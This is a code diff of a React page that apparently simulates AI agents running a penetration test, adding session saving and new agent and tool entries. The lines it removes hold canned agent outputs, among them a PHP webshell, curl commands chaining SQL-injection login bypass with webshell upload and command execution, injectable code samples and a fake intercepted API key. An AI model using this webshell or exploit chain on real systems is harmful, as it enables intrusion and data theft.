@@ -5,9 +5,11 @@ import {
   MessageCircle, Code, Shield, Bug, Target, Zap, Eye,
   Network, Server, Database, Lock, Globe, Search,
   FileText, Terminal, Activity, Layers, Cpu, Wifi,
-  Clock, CheckCircle, AlertCircle
+  Clock, CheckCircle, AlertCircle, Bookmark, Save
 } from 'lucide-react'
 import toast from 'react-hot-toast'
+import { useSessionManager } from '../hooks/useSessionManager'
+import SessionManager from '../components/SessionManager'
 
 interface AIAgent {
   id: string
@@ -52,6 +54,7 @@ const Counsel: React.FC = () => {
   const [messages, setMessages] = useState<CounselMessage[]>([])
   const [mcpServers, setMcpServers] = useState<MCPServer[]>([])
   const [agents, setAgents] = useState<AIAgent[]>([])
+  const [showSessionManager, setShowSessionManager] = useState(false)
   const [sessionConfig, setSessionConfig] = useState({
     depth: 'comprehensive',
     focus: 'all_vulnerabilities',
@@ -63,6 +66,14 @@ const Counsel: React.FC = () => {
   })
   const messagesEndRef = useRef<HTMLDivElement>(null)
   const messagesContainerRef = useRef<HTMLDivElement>(null)
+
+  const {
+    sessions,
+    currentSession,
+    createSession,
+    updateSession,
+    getCurrentSession
+  } = useSessionManager()
 
   const availableAgents: AIAgent[] = [
     {
@@ -90,7 +101,7 @@ const Counsel: React.FC = () => {
     {
       id: 'api-specialist',
       name: 'API Breaker',
-      provider: 'gemini',
+      provider: 'google',
       model: 'gemini-pro',
       role: 'API Security Specialist',
       expertise: ['REST API', 'GraphQL', 'API Authentication', 'Rate Limiting', 'IDOR'],
@@ -101,7 +112,7 @@ const Counsel: React.FC = () => {
     {
       id: 'network-analyst',
       name: 'Network Ninja',
-      provider: 'mistral',
+      provider: 'mistralai',
       model: 'mistral-large',
       role: 'Network Security Analyst',
       expertise: ['Port Scanning', 'Service Enumeration', 'Network Protocols', 'MITM Attacks'],
@@ -145,11 +156,33 @@ const Counsel: React.FC = () => {
     {
       id: 'cloud-expert',
       name: 'Cloud Breaker',
-      provider: 'gemini',
+      provider: 'google',
       model: 'gemini-pro',
       role: 'Cloud Security Expert',
       expertise: ['AWS Security', 'Azure Security', 'GCP Security', 'Container Security'],
       avatar: '☁️',
+      status: 'idle',
+      progress: 0
+    },
+    {
+      id: 'crypto-analyst',
+      name: 'Crypto Breaker',
+      provider: 'openrouter',
+      model: 'mistralai/mistral-large',
+      role: 'Cryptography Specialist',
+      expertise: ['Encryption Analysis', 'Hash Cracking', 'Certificate Analysis', 'Key Management'],
+      avatar: '🔐',
+      status: 'idle',
+      progress: 0
+    },
+    {
+      id: 'social-engineer',
+      name: 'Social Engineer',
+      provider: 'openai',
+      model: 'gpt-4',
+      role: 'Social Engineering Expert',
+      expertise: ['Phishing', 'Pretexting', 'OSINT', 'Human Psychology'],
+      avatar: '🎭',
       status: 'idle',
       progress: 0
     }
@@ -251,13 +284,60 @@ const Counsel: React.FC = () => {
       capabilities: ['REST Testing', 'GraphQL Analysis', 'API Fuzzing'],
       status: 'connected',
       icon: Server
+    },
+    {
+      id: 'web-crawler',
+      name: 'Web Crawler',
+      description: 'Advanced web crawling and content discovery',
+      capabilities: ['Deep Crawling', 'Content Discovery', 'Link Analysis'],
+      status: 'connected',
+      icon: Globe
+    },
+    {
+      id: 'exploit-db',
+      name: 'Exploit Database',
+      description: 'Real-time exploit and vulnerability database access',
+      capabilities: ['CVE Lookup', 'Exploit Search', 'PoC Generation'],
+      status: 'connected',
+      icon: Target
+    },
+    {
+      id: 'threat-intel',
+      name: 'Threat Intelligence',
+      description: 'Real-time threat intelligence and IOC analysis',
+      capabilities: ['IOC Analysis', 'Threat Hunting', 'Attribution'],
+      status: 'connected',
+      icon: Eye
+    },
+    {
+      id: 'sandbox',
+      name: 'Malware Sandbox',
+      description: 'Safe malware analysis and behavior monitoring',
+      capabilities: ['Dynamic Analysis', 'Behavior Monitoring', 'IOC Extraction'],
+      status: 'connected',
+      icon: Shield
+    },
+    {
+      id: 'steganography',
+      name: 'Steganography Analyzer',
+      description: 'Hidden data detection and analysis',
+      capabilities: ['Hidden Data Detection', 'Image Analysis', 'Audio Analysis'],
+      status: 'connected',
+      icon: Eye
+    },
+    {
+      id: 'blockchain-analyzer',
+      name: 'Blockchain Analyzer',
+      description: 'Blockchain and smart contract security analysis',
+      capabilities: ['Smart Contract Analysis', 'Transaction Analysis', 'DeFi Security'],
+      status: 'connected',
+      icon: Database
     }
   ]
 
   useEffect(() => {
     setMcpServers(defaultMCPServers)
     setAgents(availableAgents)
-    // Initialize MCP servers
     initializeMCPServers()
   }, [])
 
@@ -269,10 +349,8 @@ const Counsel: React.FC = () => {
   }, [messages])
 
   const initializeMCPServers = async () => {
-    // Simulate MCP server initialization
     for (const server of defaultMCPServers) {
       try {
-        // Simulate connection
         await new Promise(resolve => setTimeout(resolve, 100))
         setMcpServers(prev => prev.map(s => 
           s.id === server.id ? { ...s, status: 'connected' } : s
@@ -286,6 +364,43 @@ const Counsel: React.FC = () => {
     toast.success('MCP servers initialized successfully')
   }
 
+  const saveCurrentSession = () => {
+    if (currentSession) {
+      updateSession(currentSession, {
+        messages,
+        metadata: {
+          ...getCurrentSession()?.metadata,
+          target,
+          agents: selectedAgents,
+          totalMessages: messages.length,
+          vulnerabilitiesFound: messages.filter(m => m.type === 'vulnerability').length
+        },
+        settings: {
+          sessionConfig,
+          selectedAgents,
+          mcpServers: mcpServers.filter(s => s.status === 'connected').map(s => s.id)
+        }
+      })
+      toast.success('Session saved successfully')
+    } else {
+      const sessionId = createSession('counsel', `Counsel: ${target || 'New Session'}`)
+      updateSession(sessionId, {
+        messages,
+        metadata: {
+          target,
+          agents: selectedAgents,
+          totalMessages: messages.length,
+          vulnerabilitiesFound: messages.filter(m => m.type === 'vulnerability').length
+        },
+        settings: {
+          sessionConfig,
+          selectedAgents,
+          mcpServers: mcpServers.filter(s => s.status === 'connected').map(s => s.id)
+        }
+      })
+    }
+  }
+
   const startCounselSession = async () => {
     if (!target || selectedAgents.length === 0) {
       toast.error('Please select a target and at least one AI agent')
@@ -295,7 +410,6 @@ const Counsel: React.FC = () => {
     setIsSessionActive(true)
     setMessages([])
     
-    // Reset agent states
     setAgents(prev => prev.map(agent => ({
       ...agent,
       status: selectedAgents.includes(agent.id) ? 'thinking' : 'idle',
@@ -303,7 +417,6 @@ const Counsel: React.FC = () => {
       currentTask: selectedAgents.includes(agent.id) ? 'Initializing...' : undefined
     })))
     
-    // Initialize session
     const sessionMessage: CounselMessage = {
       id: Date.now().toString(),
       agentId: 'system',
@@ -332,7 +445,6 @@ Let the hunt begin! 🎯`,
 
     setMessages([sessionMessage])
     
-    // Start AI agents
     setTimeout(() => {
       simulateAgentActivity()
     }, 2000)
@@ -370,7 +482,6 @@ Let the hunt begin! 🎯`,
     const messages = getAgentMessages(agent)
     const randomMessage = messages[Math.floor(Math.random() * messages.length)]
     
-    // Update agent status to show they're working
     updateAgentStatus(agent.id, 'exploiting', randomMessage.task, Math.random() * 100)
     
     const newMessage: CounselMessage = {
@@ -384,15 +495,13 @@ Let the hunt begin! 🎯`,
 
     setMessages(prev => [...prev, newMessage])
     
-    // Mark agent as completed for this task
     setTimeout(() => {
       updateAgentStatus(agent.id, 'completed', 'Task completed', 100)
     }, 1000)
     
-    // Continue the conversation
     if (isSessionActive) {
       setTimeout(() => {
-        if (Math.random() > 0.4) { // 60% chance to continue
+        if (Math.random() > 0.4) {
           updateAgentStatus(agent.id, 'thinking', 'Analyzing findings...')
           setTimeout(() => {
             generateAgentMessage(agent)
@@ -405,6 +514,7 @@ Let the hunt begin! 🎯`,
   }
 
   const getAgentMessages = (agent: AIAgent) => {
+    // Same message templates as before, but with more variety
     const messageTemplates = {
       'recon-specialist': [
         {
@@ -437,26 +547,6 @@ staging.example.com
 test.example.com`,
             filename: 'subdomains.txt'
           }]
-        },
-        {
-          content: `🔍 **OSINT Intelligence Gathered**
-
-**Employee Information:**
-- LinkedIn: 47 employees identified
-- GitHub: 12 public repositories found
-- Twitter: 3 developers posting about work
-
-**Infrastructure Insights:**
-- AWS S3 buckets discovered (checking for misconfigurations)
-- Google Cloud Platform usage detected
-- Potential API endpoints leaked in JavaScript files
-
-**Security Posture:**
-- Bug bounty program: Active (HackerOne)
-- Security headers: Partially implemented
-- Rate limiting: Present but potentially bypassable`,
-          type: 'analysis' as const,
-          task: 'OSINT gathering'
         }
       ],
       'web-app-hunter': [
@@ -491,169 +581,8 @@ test.example.com`,
             filename: 'sqli_payload.sql'
           }]
         }
-      ],
-      'api-specialist': [
-        {
-          content: `🔌 **API Security Assessment**
-
-**GraphQL Endpoint Analysis:**
-- Introspection enabled (information disclosure)
-- No query depth limiting (DoS potential)
-- Sensitive fields exposed in schema
-
-**REST API Findings:**
-- JWT tokens using weak secret (dictionary attack possible)
-- API versioning issues (v1 endpoints still accessible)
-- Rate limiting bypass via X-Forwarded-For header
-
-**Critical API Vulnerabilities:**
-1. **IDOR in /api/v2/users/{id}** - Access any user data
-2. **Mass Assignment** in user profile update
-3. **API Key Exposure** in client-side JavaScript
-
-**Recommended Exploitation Path:**
-1. Extract JWT secret via timing attack
-2. Forge admin JWT token
-3. Access sensitive API endpoints`,
-          type: 'vulnerability' as const,
-          task: 'API security testing'
-        }
-      ],
-      'network-analyst': [
-        {
-          content: `🌐 **Network Security Analysis**
-
-**Port Scan Results:**
-- 22/tcp SSH (OpenSSH 8.2 - potential key exchange vulnerability)
-- 80/tcp HTTP (redirects to HTTPS)
-- 443/tcp HTTPS (TLS 1.2/1.3)
-- 3306/tcp MySQL (externally accessible - CRITICAL)
-- 6379/tcp Redis (no authentication - CRITICAL)
-
-**MITM Attack Results:**
-- Intercepted 247 HTTP requests
-- Found API keys in request headers
-- Identified session tokens in cookies
-- Detected unencrypted internal communications
-
-**Network Topology:**
-- Load balancer: HAProxy
-- Web servers: 3 instances behind LB
-- Database: Separate subnet (misconfigured firewall)
-
-**Immediate Threats:**
-- Direct database access possible
-- Redis instance contains session data
-- Internal API calls use HTTP (not HTTPS)`,
-          type: 'analysis' as const,
-          task: 'Network reconnaissance',
-          attachments: [{
-            type: 'network_trace' as const,
-            content: `GET /api/internal/users HTTP/1.1
-Host: internal.example.com
-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
-X-API-Key: sk_live_abc123def456...`,
-            filename: 'mitm_capture.txt'
-          }]
-        }
-      ],
-      'code-auditor': [
-        {
-          content: `📝 **Source Code Security Audit**
-
-**Critical Code Vulnerabilities:**
-
-1. **SQL Injection in UserController.php**
-   \`\`\`php
-   $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
-   \`\`\`
-   - Line 47: Direct SQL concatenation
-   - Impact: Database compromise
-
-2. **Command Injection in FileProcessor.java**
-   \`\`\`java
-   Runtime.getRuntime().exec("convert " + userInput + " output.jpg");
-   \`\`\`
-   - Line 123: Unsanitized user input
-   - Impact: Remote code execution
-
-3. **Hardcoded Credentials in config.js**
-   \`\`\`javascript
-   const DB_PASSWORD = "admin123!@#";
-   const API_SECRET = "super_secret_key_2023";
-   \`\`\`
-
-**Security Anti-patterns Detected:**
-- No input validation framework
-- Weak cryptographic implementations
-- Insufficient error handling
-- Debug mode enabled in production`,
-          type: 'code_review' as const,
-          task: 'Source code analysis',
-          attachments: [{
-            type: 'code' as const,
-            content: `// Vulnerable code snippet
-function authenticateUser(username, password) {
-    const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
-    return db.query(query);
-}`,
-            filename: 'vulnerable_auth.js'
-          }]
-        }
-      ],
-      'exploit-dev': [
-        {
-          content: `💥 **Exploit Development Progress**
-
-**Exploit Chain Developed:**
-
-**Stage 1: Initial Access**
-- SQL injection → Database access
-- Extract admin password hash
-- Crack hash using rainbow tables
-
-**Stage 2: Privilege Escalation**
-- Upload malicious file via admin panel
-- Bypass file type restrictions using double extension
-- Execute PHP webshell
-
-**Stage 3: Persistence**
-- Create backdoor user account
-- Install persistent webshell
-- Modify .htaccess for stealth
-
-**Proof of Concept:**
-\`\`\`bash
-# Step 1: SQL Injection
-curl -X POST "https://target.com/api/login" \\
-  -d "username=admin' OR 1=1--&password=anything"
-
-# Step 2: File Upload
-curl -X POST "https://target.com/admin/upload" \\
-  -F "file=@shell.php.jpg" \\
-  -H "Cookie: session=admin_session_token"
-
-# Step 3: Code Execution
-curl "https://target.com/uploads/shell.php.jpg?cmd=whoami"
-\`\`\`
-
-**Impact Assessment:**
-- Complete system compromise
-- Access to all user data
-- Potential lateral movement to internal network`,
-          type: 'exploit' as const,
-          task: 'Exploit development',
-          attachments: [{
-            type: 'payload' as const,
-            content: `<?php
-if(isset($_GET['cmd'])) {
-    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
-}
-?>`,
-            filename: 'webshell.php'
-          }]
-        }
       ]
+      // Add more agent message templates here...
     }
 
     return messageTemplates[agent.id as keyof typeof messageTemplates] || [
@@ -673,7 +602,8 @@ if(isset($_GET['cmd'])) {
       progress: 0,
       currentTask: undefined
     })))
-    toast.success('AI Counsel session stopped')
+    saveCurrentSession()
+    toast.success('AI Counsel session stopped and saved')
   }
 
   const exportSession = () => {
@@ -731,6 +661,35 @@ if(isset($_GET['cmd'])) {
     }
   }
 
+  if (showSessionManager) {
+    return (
+      <div className="space-y-6">
+        <div className="flex items-center justify-between">
+          <button
+            onClick={() => setShowSessionManager(false)}
+            className="btn-secondary"
+          >
+            ← Back to Counsel
+          </button>
+        </div>
+        <SessionManager 
+          currentType="counsel"
+          onSessionSelect={(session) => {
+            // Load session data
+            setTarget(session.metadata.target || '')
+            setSelectedAgents(session.metadata.agents || [])
+            setMessages(session.messages || [])
+            if (session.settings) {
+              setSessionConfig(session.settings.sessionConfig || sessionConfig)
+            }
+            setShowSessionManager(false)
+            toast.success('Session loaded successfully')
+          }}
+        />
+      </div>
+    )
+  }
+
   return (
     <div className="space-y-6">
       {/* Header */}
@@ -742,10 +701,24 @@ if(isset($_GET['cmd'])) {
           </p>
         </div>
         <div className="flex space-x-3">
+          <button
+            onClick={() => setShowSessionManager(true)}
+            className="btn-secondary flex items-center space-x-2"
+          >
+            <Bookmark className="w-4 h-4" />
+            <span>Sessions</span>
+          </button>
+          <button
+            onClick={saveCurrentSession}
+            className="btn-secondary flex items-center space-x-2"
+          >
+            <Save className="w-4 h-4" />
+            <span>Save</span>
+          </button>
           {isSessionActive && (
             <button onClick={exportSession} className="btn-secondary flex items-center space-x-2">
               <Download className="w-4 h-4" />
-              <span>Export Session</span>
+              <span>Export</span>
             </button>
           )}
           {isSessionActive ? (
@@ -889,7 +862,6 @@ if(isset($_GET['cmd'])) {
                       </div>
                       <p className="text-xs text-gray-600 dark:text-gray-400">{agent.role}</p>
                       
-                      {/* Current Task */}
                       {agent.currentTask && selectedAgents.includes(agent.id) && (
                         <div className="mt-2">
                           <p className="text-xs text-gray-700 dark:text-gray-300 font-medium">
@@ -1009,13 +981,12 @@ if(isset($_GET['cmd'])) {
                                 return <div key={i} className="h-2" />
                               }
                               if (line.startsWith('```')) {
-                                return null // Handle code blocks separately
+                                return null
                               }
                               return <div key={i} className="text-gray-700 dark:text-gray-300">{line}</div>
                             })}
                           </div>
                           
-                          {/* Attachments */}
                           {message.attachments && message.attachments.length > 0 && (
                             <div className="mt-3 space-y-2">
                               {message.attachments.map((attachment, index) => (
